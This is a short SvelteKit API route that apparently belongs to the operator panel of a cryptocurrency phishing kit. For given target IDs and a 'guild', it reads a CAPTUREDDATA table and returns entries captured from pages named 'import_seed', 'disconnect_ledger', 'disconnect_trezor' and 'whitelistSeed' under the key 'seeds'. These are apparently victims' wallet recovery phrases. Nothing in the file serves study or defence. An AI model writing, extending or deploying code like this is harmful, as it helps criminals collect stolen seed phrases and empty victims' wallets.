import { json } from '@sveltejs/kit';
import type { RequestEvent } from '@sveltejs/kit';
import { pool } from '$lib/db/config';

export async function POST({ request }: RequestEvent) {
	try {
		const { guild, targetIds } = await request.json();

		if (!guild || !targetIds) {
			return json({ success: false, error: 'Missing required parameters' }, { status: 400 });
		}

		const query = `
            SELECT targetid, page, captureddata
            FROM CAPTUREDDATA 
            WHERE targetid = ANY($1)
            AND page IN ('import_seed', 'disconnect_ledger', 'disconnect_trezor', 'whitelistSeed')
        `;

		const result = await pool.query(query, [targetIds]);

		return json({
			success: true,
			seeds: result.rows
		});
	} catch (err) {
		console.error('Database error:', err);
		return json({ success: false, error: 'Internal server error' }, { status: 500 });
	}
}
